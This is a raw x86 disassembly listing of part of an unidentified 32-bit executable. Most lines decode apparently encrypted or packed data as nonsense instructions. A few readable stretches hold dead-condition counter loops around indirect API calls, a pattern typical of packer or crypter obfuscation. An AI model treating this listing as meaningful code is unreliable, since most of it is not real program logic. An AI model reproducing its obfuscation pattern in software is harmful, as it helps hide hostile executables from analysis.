  409df5:	imul   ebx,ebp,0x9d0a542
  409dfb:	cmp    eax,0x8f106669
  409e00:	lods   al,BYTE PTR ds:[esi]
  409e01:	jbe    0x409e44
  409e03:	add    eax,0x63e833c7
  409e08:	mov    esp,0xae8f66ba
  409e0d:	and    ecx,esp
  409e0f:	pop    edi
  409e10:	adc    edi,DWORD PTR [edx+0x2c806d66]
  409e16:	mov    DWORD PTR [esi],edi
  409e18:	jmp    0x409da5
  409e1a:	outs   dx,BYTE PTR ds:[esi]
  409e1b:	mov    sp,0x3db9
  409e1f:	lock int 0x5
  409e22:	pop    DWORD PTR [esi]
  409e24:	jno    0x409dbf
  409e26:	aad    0x36
  409e28:	das    
  409e29:	mov    ch,0x5b
  409e2b:	jnp    0x409dd6
  409e2d:	test   BYTE PTR [ebx],ch
  409e2f:	(bad)  
  409e31:	(bad)  
  409e33:	(bad)  
  409e34:	and    al,0x99
  409e36:	and    al,0xd9
  409e38:	fwait
  409e39:	or     ebp,ebp
  409e3b:	pop    esp
  409e3c:	add    DWORD PTR [edi-0x3a205ac0],0xffffffdd
  409e43:	xor    ebx,DWORD PTR [ebx-0x10de6c6f]
  409e49:	or     al,0xcb
  409e4b:	push   ebp
  409e4c:	jb     0x409eb9
  409e4e:	les    ebp,FWORD PTR [edi]
  409e50:	rcr    DWORD PTR [eax-0xc],0xd2
  409e54:	cli    
  409e55:	jae    0x409ea4
  409e57:	test   al,0x8e
  409e59:	aad    0xba
  409e5b:	fidiv  DWORD PTR [esi-0x21c09e9e]
  409e61:	xor    cl,BYTE PTR [eax+0x712b88da]
  409e67:	sbb    DWORD PTR gs:[edx+0x62],edx
  409e6b:	fcomp  QWORD PTR [ebx-0x2838edba]
  409e71:	(bad)  
  409e72:	call   0x4294:0x7df827ee
  409e79:	push   ebp
  409e7a:	aad    0x7e
  409e7c:	sub    DWORD PTR [ecx],esp
  409e7e:	adc    ebp,edx
  409e80:	into   
  409e81:	pop    ebx
  409e82:	push   edi
  409e83:	stos   BYTE PTR es:[edi],al
  409e84:	jl     0x409e9c
  409e86:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e88:	and    ecx,DWORD PTR ds:0x9788dd1e
  409e8e:	ret    
  409e8f:	icebp  
  409e90:	and    ebx,DWORD PTR [esi]
  409e92:	or     ebx,edi
  409e94:	or     BYTE PTR [edx+0x33],bl
  409e97:	rcr    bl,1
  409e99:	repz xlat BYTE PTR ds:[ebx]
  409e9b:	das    
  409e9c:	shr    edx,0xc0
  409e9f:	cmp    BYTE PTR [esi+0x73],cl
  409ea2:	pop    ecx
  409ea3:	outs   dx,BYTE PTR ds:[esi]
  409ea4:	imul   ebx,DWORD PTR [esi+0x30],0x49
  409ea8:	jmp    0xc03c:0x3120746f
  409eaf:	sbb    BYTE PTR [ebx+ebp*8],0x29
  409eb3:	lods   eax,DWORD PTR ds:[esi]
  409eb4:	and    BYTE PTR [ebp+0x743c8216],bl
  409eba:	je     0x409eeb
  409ebc:	scas   eax,DWORD PTR es:[edi]
  409ebd:	xor    DWORD PTR [edi-0x7],esp
  409ec0:	mov    ebx,DWORD PTR [eax-0x5d40a208]
  409ec6:	push   ebx
  409ec7:	pop    esp
  409ec8:	nop
  409ec9:	xor    eax,0xaadd4fd2
  409ece:	pusha  
  409ecf:	pop    ds
  409ed0:	inc    edx
  409ed1:	and    DWORD PTR [edx+0x47b4a4cd],esi
  409ed7:	mov    eax,0xb8187c2c
  409edc:	mov    eax,ds:0x1b7e1273
  409ee1:	mov    ds:0xebae9ad5,eax
  409ee6:	and    BYTE PTR [ecx],bh
  409ee8:	jns    0x409f3a
  409eea:	inc    eax
  409eeb:	nop
  409eec:	jecxz  0x409eee
  409eee:	(bad)  
  409eef:	(bad)  
  409ef0:	mov    cl,BYTE PTR [edx]
  409ef2:	das    
  409ef3:	test   eax,0x85b4cc44
  409ef8:	xor    DWORD PTR [edi+edi*2+0x7d],eax
  409efc:	ror    ecx,cl
  409efe:	jne    0x409ec5
  409f00:	aad    0xaf
  409f02:	add    bl,cl
  409f04:	jnp    0x409f65
  409f06:	xor    DWORD PTR [edi-0x12081eb5],esp
  409f0c:	jbe    0x409eff
  409f0e:	fist   DWORD PTR [edx-0x59]
  409f11:	inc    ecx
  409f12:	cmp    al,0xff
  409f14:	jne    0x409f8c
  409f16:	and    ecx,DWORD PTR [eax]
  409f18:	mov    bh,0x6a
  409f1a:	ror    ecx,0xd9
  409f1d:	data16 (bad) 
  409f1f:	or     bh,BYTE PTR [ecx+ebp*1+0x6fd06225]
  409f26:	(bad)  
  409f27:	fld    TBYTE PTR [esi]
  409f29:	ins    BYTE PTR es:[edi],dx
  409f2a:	mov    eax,ds:0x72487490
  409f2f:	sub    DWORD PTR [edx],edx
  409f31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f32:	out    0x24,al
  409f34:	loope  0x409ecf
  409f36:	and    esi,DWORD PTR [ebp+edx*1+0x5c]
  409f3a:	repnz sub esp,0xffffff86
  409f3e:	add    al,0x91
  409f40:	add    DWORD PTR [ecx],0x27
  409f43:	fnstenv [esi+0x1e]
  409f46:	loope  0x409f35
  409f48:	mov    ebp,0xdf7792db
  409f4d:	adc    al,0xd4
  409f4f:	pop    esp
  409f50:	sub    DWORD PTR [edx],esi
  409f52:	data16 jno 0x409fc2
  409f55:	mov    ds:0x5d91b518,eax
  409f5a:	and    eax,0xb69c241b
  409f5f:	cmp    esi,esp
  409f61:	add    bl,cl
  409f63:	sbb    eax,0x90e02aea
  409f68:	and    ebp,ebp
  409f6a:	pop    ebx
  409f6b:	pop    es
  409f6c:	or     BYTE PTR [eax+ebp*2],cl
  409f6f:	jecxz  0x409f46
  409f71:	pop    es
  409f72:	stos   BYTE PTR es:[edi],al
  409f73:	test   DWORD PTR [ebp-0x6732e4f8],esp
  409f79:	sbb    BYTE PTR ds:0x218bacba,bh
  409f7f:	push   cs
  409f80:	loopne 0x409f3c
  409f82:	and    eax,0xe9c01846
  409f87:	sub    DWORD PTR [edi],edx
  409f89:	mov    cs,WORD PTR [ebx]
  409f8b:	mov    ah,0x9b
  409f8d:	shl    DWORD PTR [esi+0x52],0xa6
  409f91:	dec    ebp
  409f92:	scas   eax,DWORD PTR es:[edi]
  409f93:	outs   dx,DWORD PTR ds:[esi]
  409f94:	lds    esp,FWORD PTR [edi+0x10]
  409f97:	inc    esi
  409f98:	inc    edx
  409f99:	jmp    0x902d9a99
  409f9e:	xor    esi,ebx
  409fa0:	cld    
  409fa1:	add    bl,ah
  409fa3:	shr    BYTE PTR [eax],1
  409fa5:	xchg   edi,eax
  409fa6:	div    ebx
  409fa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fa9:	sbb    dl,BYTE PTR [ecx-0x60]
  409fac:	sub    BYTE PTR [ebx+0x41c2732f],cl
  409fb2:	test   BYTE PTR [edi],dl
  409fb4:	cli    
  409fb5:	scas   al,BYTE PTR es:[edi]
  409fb6:	add    al,0xdb
  409fb8:	in     al,0xbb
  409fba:	call   FWORD PTR [ebp-0x61]
  409fbd:	jns    0x409f68
  409fbf:	rcr    DWORD PTR [ecx],0x78
  409fc2:	adc    BYTE PTR [edx+0x69],dl
  409fc5:	test   eax,0x7bb305e9
  409fca:	and    al,0xd0
  409fcc:	mov    bh,0x65
  409fce:	or     DWORD PTR [esi],edi
  409fd0:	in     eax,dx
  409fd1:	jge    0x409f85
  409fd3:	mov    cl,0x55
  409fd5:	xchg   DWORD PTR [edx],ebx
  409fd7:	mov    bl,BYTE PTR gs:[edx]
  409fda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fdb:	leave  
  409fdc:	inc    ebp
  409fdd:	xchg   edi,eax
  409fde:	inc    ebx
  409fdf:	lods   eax,DWORD PTR ds:[esi]
  409fe0:	fist   WORD PTR [eax+0x45032ede]
  409fe6:	lods   al,BYTE PTR ds:[esi]
  409fe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fe8:	pop    eax
  409fe9:	dec    esi
  409fea:	icebp  
  409feb:	cmp    dh,BYTE PTR [esi-0x25]
  409fee:	or     DWORD PTR [edx],0xcfda9e43
  409ff4:	arpl   ax,cx
  409ff6:	std    
  409ff7:	mov    DWORD PTR [esi+eiz*1],ecx
  409ffa:	cmp    BYTE PTR [eax],cl
  409ffc:	loop   0x40a06f
  409ffe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fff:	aad    0x4a
  40a001:	fcos   
  40a003:	sbb    DWORD PTR [edi],ebx
  40a005:	jp     0x40a058
  40a007:	daa    
  40a008:	add    bl,dl
  40a00a:	add    DWORD PTR [esi+eiz*2+0xffe35fa],0xffffffaf
  40a012:	sar    BYTE PTR [ecx+0x4573],1
  40a018:	mov    edi,DWORD PTR ds:0x433853
  40a01e:	sbb    DWORD PTR ds:0x43378f,edi
  40a024:	add    edx,ecx
  40a026:	mov    esi,0x7879
  40a02b:	mov    edi,0x1556
  40a030:	xchg   esi,ecx
  40a032:	adc    DWORD PTR ds:0x4337e3,edi
  40a038:	sub    edx,edi
  40a03a:	and    ecx,DWORD PTR ds:0x4337a3
  40a040:	xor    esi,esi
  40a042:	and    DWORD PTR ds:0x4337db,0x0
  40a04c:	mov    ecx,DWORD PTR ds:0x4337db
  40a052:	inc    ecx
  40a053:	mov    DWORD PTR ds:0x4337db,ecx
  40a059:	cmp    DWORD PTR ds:0x4337db,0x2e
  40a060:	jne    0x40a076
  40a066:	push   0x4339be
  40a06b:	push   0x400000
  40a070:	call   DWORD PTR ds:0x4120dc
  40a076:	cmp    DWORD PTR ds:0x4337db,0x1f
  40a07d:	jb     0x40a04c
  40a083:	mov    DWORD PTR [ebp-0x28],esi
  40a086:	mov    DWORD PTR ds:0x43378b,0x11
  40a090:	cmp    DWORD PTR ds:0x43378b,0x0
  40a097:	je     0x40a0f0
  40a09d:	cmp    DWORD PTR ds:0x43378b,0x6
  40a0a4:	jne    0x40a0be
  40a0aa:	push   DWORD PTR [ebp-0x24]
  40a0ad:	push   0x64fc
  40a0b2:	push   DWORD PTR [ebp-0x24]
  40a0b5:	push   DWORD PTR [ebp-0x14]
  40a0b8:	call   DWORD PTR ds:0x4122a4
  40a0be:	cmp    DWORD PTR ds:0x43378b,0x7
  40a0c5:	jne    0x40a0d8
  40a0cb:	mov    ecx,DWORD PTR ds:0x43378b
  40a0d1:	dec    ecx
  40a0d2:	mov    DWORD PTR ds:0x43378b,ecx
  40a0d8:	mov    ecx,DWORD PTR ds:0x43378b
  40a0de:	dec    ecx
  40a0df:	mov    DWORD PTR ds:0x43378b,ecx
  40a0e5:	jmp    0x40a090
  40a0ea:	adc    DWORD PTR ds:0x433783,ecx
  40a0f0:	mov    DWORD PTR [ebp-0x2c],esi
  40a0f3:	mov    ecx,DWORD PTR ds:0x4337ef
  40a0f9:	sub    ecx,DWORD PTR ds:0x433793
  40a0ff:	mov    DWORD PTR ds:0x4337ef,ecx
  40a105:	mov    DWORD PTR [ebp-0x14],esi
  40a108:	or     DWORD PTR ds:0x4337e7,0x653d
  40a112:	mov    DWORD PTR [ebp-0x8],esi
  40a115:	jmp    0x40a378
  40a11a:	mov    gs,ebp
  40a11c:	data16 fwait
  40a11e:	gs mov cl,0x53
  40a121:	jmp    0x31127192
  40a126:	stc    
  40a127:	shl    DWORD PTR [esi],0x85
  40a12a:	and    al,0x7e
  40a12d:	jle    0x40a167
  40a12f:	jl     0x40a1af
  40a131:	jle    0x40a10f
  40a133:	cwde   
  40a134:	(bad)  
  40a135:	ror    DWORD PTR [edi],1
  40a137:	jge    0x40a1b2
  40a139:	mov    al,ds:0xc6df15ba
  40a13e:	call   0xb1b971b0
  40a143:	std    
  40a144:	pop    ecx
  40a145:	ret    
  40a146:	ins    DWORD PTR es:[edi],dx
  40a147:	js     0x40a1c3
  40a149:	push   cs
  40a14a:	mov    ecx,0x1eca0ef5
  40a14f:	pop    ecx
  40a150:	call   0xaa7032d3
  40a155:	mov    ah,0xca
  40a157:	mov    al,0x2e
  40a159:	sbb    eax,0x19c0ed9a
  40a15e:	pop    edi
  40a15f:	jo     0x40a17f
  40a161:	jnp    0x40a178
  40a163:	or     dl,bh
  40a165:	inc    ecx
  40a166:	out    0xc6,al
  40a168:	inc    edx
  40a169:	outs   dx,BYTE PTR ds:[esi]
  40a16a:	hlt    
  40a16b:	out    dx,eax
  40a16c:	add    DWORD PTR [edx-0x63fdf0f1],esp
  40a172:	mov    es,WORD PTR [eax]
  40a174:	addr16 and al,0xf9
  40a177:	mov    bl,0x25
  40a179:	jne    0x40a153
  40a17b:	cmp    eax,0x8723851
  40a180:	or     ebp,DWORD PTR [esi-0x721b33b4]
  40a186:	mov    ebx,DWORD PTR [ecx]
  40a188:	scas   al,BYTE PTR es:[edi]
  40a189:	out    dx,eax
  40a18a:	lds    ebx,FWORD PTR [esi]
  40a18c:	jle    0x40a1f5
  40a18e:	pop    edi
  40a18f:	lahf   
  40a190:	sbb    DWORD PTR [ebp-0x64],ebp
  40a193:	loop   0x40a175
  40a195:	pop    edi
  40a196:	jl     0x40a184
  40a198:	(bad)  
  40a19a:	mov    ebp,ebp
  40a19c:	dec    DWORD PTR [edi-0x7a]
  40a19f:	sahf   
  40a1a0:	icebp  
  40a1a1:	ins    BYTE PTR es:[edi],dx
  40a1a2:	(bad)  
  40a1a3:	int3   
  40a1a4:	add    BYTE PTR ds:0xa492c72a,0xd9
  40a1ab:	pop    es
  40a1ac:	push   eax
  40a1ad:	sbb    eax,0xa5cbcfc4
  40a1b2:	cmp    al,0x5a
  40a1b4:	jge    0x40a13e
  40a1b6:	push   eax
  40a1b7:	or     dl,BYTE PTR ds:0x6722807f
  40a1bd:	leave  
  40a1be:	xchg   esp,eax
  40a1bf:	sahf   
  40a1c0:	lds    edi,FWORD PTR [esi-0x7e]
  40a1c3:	in     eax,0x36
  40a1c5:	inc    ecx
  40a1c6:	adc    al,0x4d
  40a1c8:	je     0x40a1e9
  40a1ca:	lods   eax,DWORD PTR ds:[esi]
  40a1cb:	sbb    BYTE PTR [ebp+0x74651b6d],bh
  40a1d1:	pusha  
  40a1d2:	stos   BYTE PTR es:[edi],al
  40a1d3:	fcom   QWORD PTR [ebx+0xb529ce9]
  40a1d9:	sar    DWORD PTR [edi-0x7e],0x37
  40a1dd:	fistp  DWORD PTR [ecx-0x667ddaf5]
  40a1e3:	in     al,0x19
  40a1e5:	addr16 iret 
  40a1e7:	sbb    esi,esp
  40a1e9:	test   BYTE PTR [ecx+0x21567bcc],ch
  40a1ef:	dec    eax
  40a1f0:	pop    ebx
  40a1f1:	std    
  40a1f2:	inc    ecx
  40a1f3:	sub    BYTE PTR [edi+0x780479a6],bh
  40a1f9:	icebp  
  40a1fa:	stc    
  40a1fb:	lea    ebp,[esi+0x67e3722b]
  40a201:	aaa    
  40a202:	mov    ch,0x1a
  40a204:	(bad)  
  40a205:	imul   ebp,DWORD PTR [esi-0x77],0xffffff84
  40a209:	daa    
  40a20a:	sar    DWORD PTR [ebp-0x79],0x9e
  40a20e:	xor    DWORD PTR [esi-0x2824d18b],edx
  40a214:	sbb    DWORD PTR [eax+0x4a],0xb4f7ea05
  40a21b:	dec    edx
  40a21c:	sub    BYTE PTR [ebp+0x6642de4e],cl
  40a222:	and    BYTE PTR [ebx-0x43],ah
  40a225:	int3   
  40a226:	inc    edx
  40a227:	shr    BYTE PTR ds:0x255dddc5,cl
  40a22d:	pop    ds
  40a22e:	cwde   
  40a22f:	in     al,0x50
  40a231:	pop    ss
  40a232:	test   eax,0x326e0be4
  40a237:	pmaxsw mm1,QWORD PTR [ebp-0x7dcc2567]
  40a23e:	adc    ch,ch
  40a240:	jecxz  0x40a20e
  40a242:	out    dx,al
  40a243:	iret   
  40a244:	xchg   ebx,eax
  40a245:	fucomp st(3)
  40a247:	adc    eax,0x3d7673fb
  40a24c:	xor    BYTE PTR [edi],cl
  40a24e:	jne    0x40a1ff
  40a250:	cmp    eax,0x9513cd14
  40a255:	mov    cl,0x75
  40a257:	es into 
  40a259:	mov    eax,0x5c3f0917
  40a25e:	pop    DWORD PTR [edx+esi*4-0x77]
  40a262:	pop    ecx
  40a263:	or     al,0x68
  40a266:	loope  0x40a2d3
  40a268:	and    ax,0x2a41
  40a26c:	sbb    ebx,DWORD PTR [esi+ecx*8]
  40a26f:	stos   BYTE PTR es:[edi],al
  40a270:	mov    bh,0xab
  40a272:	inc    ecx
  40a273:	and    eax,0x462e0914
  40a278:	inc    edx
  40a279:	sbb    BYTE PTR [ecx+ebx*2],cl
  40a27c:	jno    0x40a2d3
  40a27e:	adc    eax,0xa279b369
  40a283:	jmp    0x40a20f
  40a285:	shl    BYTE PTR [edi],1
  40a287:	ficomp DWORD PTR [esp+edi*2-0x6d]
  40a28b:	jne    0x40a2f7
  40a28d:	imul   ecx,DWORD PTR [ebx+esi*2],0x60e2bb9f
  40a294:	sahf   
  40a295:	(bad)  
  40a296:	jle    0x40a277
  40a298:	out    0x25,eax
  40a29a:	cmp    esp,DWORD PTR [edi-0x24]
  40a29d:	mov    al,fs:0xd06b3898
  40a2a3:	jge    0x40a2f9
  40a2a5:	loopne 0x40a269
  40a2a7:	cli    
  40a2a8:	rol    DWORD PTR [ecx],cl
  40a2aa:	mov    eax,0x16c16da4
  40a2af:	nop
  40a2b0:	lock sbb esi,DWORD PTR [edx]
  40a2b3:	pushf  
  40a2b4:	pop    DWORD PTR [eax-0x4a]
  40a2b7:	adc    ecx,ecx
  40a2b9:	je     0x40a295
  40a2bb:	dec    ebx
  40a2bc:	dec    ecx
  40a2bd:	jge    0x40a2e4
  40a2bf:	test   BYTE PTR [eax-0x52883828],0xbf
  40a2c6:	dec    edi
  40a2c7:	daa    
  40a2c8:	imul   ecx,ebx,0x1d
  40a2cb:	xchg   esi,eax
  40a2cc:	pop    ss
  40a2cd:	xchg   esi,eax
  40a2ce:	in     al,dx
  40a2cf:	lahf   
  40a2d0:	pop    ebp
  40a2d1:	loop   0x40a272
  40a2d3:	add    ebx,DWORD PTR [ecx-0x3e]
  40a2d6:	mov    ecx,0xabf63410
  40a2db:	or     eax,0x53de3308
  40a2e0:	lahf   
  40a2e1:	sub    BYTE PTR ds:0xdee47d7a,bl
  40a2e7:	pop    edx
  40a2e8:	mov    ds:0x6fde136a,eax
  40a2ed:	ins    DWORD PTR es:[edi],dx
  40a2ee:	xchg   edi,eax
  40a2ef:	jmp    0xd7f3360b
  40a2f4:	mov    bh,0xb8
  40a2f6:	fimul  WORD PTR [ebx+0x33]
  40a2f9:	out    dx,eax
  40a2fa:	fbld   TBYTE PTR [esi-0x3bb3ac2e]
  40a300:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a301:	inc    esi
  40a302:	push   cs
  40a303:	cli    
  40a304:	inc    esp
  40a305:	popa   
  40a306:	inc    ecx
  40a307:	adc    BYTE PTR [ecx-0x4b37f76],ch
  40a30d:	adc    BYTE PTR [ebx],al
  40a30f:	stc    
  40a310:	cmp    DWORD PTR [esi-0x71389e89],eax
  40a316:	imul   esi,DWORD PTR [ecx],0x77582e8f
  40a31c:	inc    ecx
  40a31d:	mov    dl,0x86
  40a31f:	pop    ds
  40a320:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a321:	sbb    ch,bl
  40a323:	mov    dh,0xc5
  40a325:	aam    0x65
  40a327:	repz jb 0x40a37d
  40a32a:	add    BYTE PTR [ebp-0x13],al
  40a32d:	inc    eax
  40a32e:	mov    DWORD PTR [esi-0x1a],edx
  40a331:	lods   al,BYTE PTR ds:[esi]
  40a332:	xor    cl,BYTE PTR [esi+edx*8-0x3ca83e03]
  40a339:	pop    edi
  40a33a:	dec    edx
  40a33b:	xchg   ebx,eax
  40a33c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a33d:	mov    ecx,0xc3334294
  40a342:	sub    BYTE PTR ds:0xa806ea13,dl
  40a348:	shl    DWORD PTR [ecx+0x32],1
  40a34b:	xchg   esp,eax
  40a34c:	jp     0x40a32c
  40a34e:	out    0xc9,eax
  40a350:	pop    ebp
  40a351:	jle    0x40a329
  40a353:	fwait
  40a354:	adc    ebp,esp
  40a356:	jo     0x40a332
  40a358:	cli    
  40a359:	inc    eax
  40a35a:	xor    BYTE PTR [edx+eax*4+0x64dc3d8e],bl
  40a361:	mov    bh,0xab
  40a363:	(bad)  
  40a364:	neg    DWORD PTR [ebx]
  40a366:	call   0x6e913449
  40a36b:	loopne 0x40a2ee
  40a36d:	pusha  
  40a36e:	or     al,0xb8
  40a370:	pop    ecx
  40a371:	push   0xffffff95
  40a373:	jecxz  0x40a342
  40a375:	cs inc edx
  40a377:	les    ecx,FWORD PTR [ebx-0x37cc17b3]
  40a37d:	and    DWORD PTR ds:0x43377b,0x0
  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x43377b
  40a394:	inc    eax
  40a395:	mov    ds:0x43377b,eax
  40a39a:	cmp    DWORD PTR ds:0x43377b,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x43377b,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x43386f
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x4337eb
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x4337e7,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x4337e7,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x4337e7,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433817
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x4337e7,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x4337e7
  40a434:	dec    eax
  40a435:	mov    ds:0x4337e7,eax
  40a43a:	mov    eax,ds:0x4337e7
  40a43f:	dec    eax
  40a440:	mov    ds:0x4337e7,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43379f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x4338af
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x4338a3,0x433827
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433787,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	imul   eax,DWORD PTR [edx+0x15],0x7eee4ccc
  40a4a2:	jle    0x40a4dc
  40a4a4:	jl     0x40a524
  40a4a6:	jle    0x40a4b4
  40a4a8:	xor    edx,DWORD PTR [edi-0x19]
  40a4ab:	loop   0x40a442
  40a4ad:	hlt    
  40a4ae:	test   al,0x7a
  40a4b0:	out    dx,al
  40a4b1:	out    dx,al
  40a4b2:	popa   
  40a4b3:	lea    ecx,[ebx-0x3d0f7d5f]
  40a4b9:	add    DWORD PTR [esi-0x5a9c59eb],esi
  40a4bf:	jmp    0x40a4df
  40a4c1:	xchg   ebx,eax
  40a4c2:	push   ecx
  40a4c3:	jno    0x40a4c5
  40a4c5:	in     eax,0x4
  40a4c7:	lock jl 0x40a4c1
  40a4ca:	jb     0x40a4fb
  40a4cc:	sar    BYTE PTR [ebp-0x68],1
  40a4cf:	icebp  
  40a4d0:	jl     0x40a522
  40a4d2:	fadd   QWORD PTR [edx+0x37]
  40a4d5:	mov    ds:0xb6939069,eax
  40a4da:	mov    ecx,DWORD PTR [edi-0x36]
  40a4dd:	(bad)  
  40a4de:	or     DWORD PTR [esi],eax
  40a4e0:	add    dx,WORD PTR [eax-0x4e]
  40a4e4:	(bad)  
  40a4e5:	aaa    
  40a4e6:	inc    ecx
  40a4e7:	sbb    al,0xeb
  40a4e9:	pusha  
  40a4ea:	jmp    0x40a52c
  40a4ec:	mov    bh,0xd4
  40a4ee:	xchg   edi,eax
  40a4ef:	push   0xffffff92
  40a4f1:	push   ebp
  40a4f2:	jne    0x40a4c7
  40a4f4:	test   BYTE PTR [ebp-0x53],dl
  40a4f7:	or     al,0xd3
  40a4f9:	cmp    ch,dl
  40a4fb:	add    DWORD PTR [ebp+0x52],eax
  40a4fe:	lods   al,BYTE PTR ds:[esi]
  40a4ff:	fwait
  40a500:	xlat   BYTE PTR ds:[ebx]
  40a501:	push   ds
  40a502:	in     al,0xe0
  40a504:	stc    
  40a505:	dec    ebp
  40a506:	or     al,0x7a
  40a509:	mov    edx,0x4467ffb2
  40a50e:	imul   edx,DWORD PTR [eax-0x28],0x554ad77a
  40a515:	push   es
  40a516:	jge    0x40a540
  40a518:	leave  
  40a519:	outs   dx,DWORD PTR ds:[esi]
  40a51a:	sub    ah,BYTE PTR [esi]
  40a51c:	mov    ds:0xc8880672,al
  40a521:	mov    eax,0x440f99db
  40a526:	in     eax,dx
  40a527:	add    BYTE PTR [ebx+0x29],0xeb
  40a52b:	mov    ah,BYTE PTR [esi-0x4306cf14]
  40a531:	mov    ecx,0xecb406d4
  40a536:	cli    
  40a537:	pop    es
  40a538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a539:	mov    ch,0x7a
  40a53b:	imul   ebp,edx,0xffffffe0
  40a53e:	push   ecx
  40a53f:	sub    al,0xa2
  40a541:	iret   
  40a542:	mov    bh,0x97
  40a544:	daa    
  40a545:	loope  0x40a56f
  40a547:	sbb    BYTE PTR [esi+0x13],bl
  40a54a:	enter  0x14e8,0xa8
  40a54e:	lods   eax,DWORD PTR ds:[esi]
  40a54f:	mov    ah,0x9d
  40a551:	imul   ecx,DWORD PTR [ebp+0x43],0xaebafc3c
  40a558:	into   
  40a559:	mov    dh,0xee
  40a55b:	sbb    eax,edi
  40a55d:	aam    0x2a
  40a55f:	push   ecx
  40a560:	out    dx,al
  40a561:	fcomp  QWORD PTR [eax+0xd]
  40a564:	fcom   DWORD PTR ds:0x681195cc
  40a56a:	clc    
  40a56b:	fucomi st,st(2)
  40a56d:	mov    ecx,ecx
  40a56f:	push   ebp
  40a570:	pop    edx
  40a571:	bnd jle 0x40a5e0
  40a574:	jns    0x40a5a5
  40a576:	add    al,0x56
  40a578:	mov    cs,eax
  40a57a:	inc    edi
  40a57b:	jne    0x40a59d
  40a57d:	cmp    bl,dl
  40a57f:	outs   dx,BYTE PTR ds:[esi]
  40a580:	inc    esi
  40a581:	push   ds
  40a582:	mov    BYTE PTR [edi+0x4e],ch
  40a585:	sub    eax,0x295ffa6c
  40a58a:	mov    ds:0x4514918,al
  40a58f:	(bad)  
  40a590:	xor    eax,0x507a06c5
  40a595:	addr16 xchg esp,eax
  40a597:	cmp    BYTE PTR [eax-0x16],ch
  40a59a:	retf   0x2f3a
  40a59d:	stc    
  40a59e:	imul   edi,DWORD PTR [esi+0x313660e2],0xded8f5c1
  40a5a8:	test   eax,0xc005a826
  40a5ad:	cmp    ah,ah
  40a5af:	cli    
  40a5b0:	mov    bh,BYTE PTR ds:0xc50cba52
  40a5b6:	popf   
  40a5b7:	pop    eax
  40a5b8:	int    0x69
  40a5ba:	call   DWORD PTR [edx]
  40a5bc:	xchg   edi,ebp
  40a5be:	(bad)  
  40a5bf:	jp     0x40a634
  40a5c1:	lea    esp,[edx+ecx*2-0x54]
  40a5c5:	mov    DWORD PTR [edi+edx*4],ecx
  40a5c8:	fst    DWORD PTR [esi]
  40a5ca:	pop    esp
  40a5cb:	pop    ebx
  40a5cc:	push   esp
  40a5cd:	pop    esp
  40a5ce:	test   al,dh
  40a5d0:	mov    WORD PTR [esi+0x4c18c819],ds
  40a5d6:	lods   eax,DWORD PTR ds:[esi]
  40a5d7:	add    esi,DWORD PTR [ebx]
  40a5d9:	push   ecx
  40a5da:	shl    DWORD PTR [ebx+0x4e930561],1
  40a5e0:	jb     0x40a5b1
  40a5e2:	adc    al,0x8b
  40a5e4:	lds    edx,FWORD PTR [ecx-0x77afa64b]
  40a5ea:	inc    edx
  40a5ec:	push   ss
  40a5ed:	call   0xca220c4d
  40a5f2:	test   al,0xe2
  40a5f4:	aad    0x69
  40a5f6:	rcr    BYTE PTR [ecx],0x90
  40a5f9:	call   0x4b34:0x177e533b
  40a600:	int3   
  40a601:	sub    BYTE PTR [eax],ah
  40a603:	in     al,dx
  40a604:	ret    0x9538
  40a607:	or     DWORD PTR cs:[ebx+0x7bc52c09],eax
  40a60e:	inc    ebx
  40a60f:	xchg   BYTE PTR [edx+0x311d9e7f],bh
  40a615:	ror    BYTE PTR [eax],0x50
  40a618:	clc    
  40a619:	adc    dh,0x59
  40a61c:	dec    edx
  40a61d:	adc    al,0x29
  40a61f:	xlat   BYTE PTR ds:[ebx]
  40a620:	subps  xmm7,XMMWORD PTR [ebx]
  40a623:	adc    BYTE PTR [ebx],dh
  40a625:	popf   
  40a626:	or     eax,esi
  40a628:	fdivr  QWORD PTR [eax]
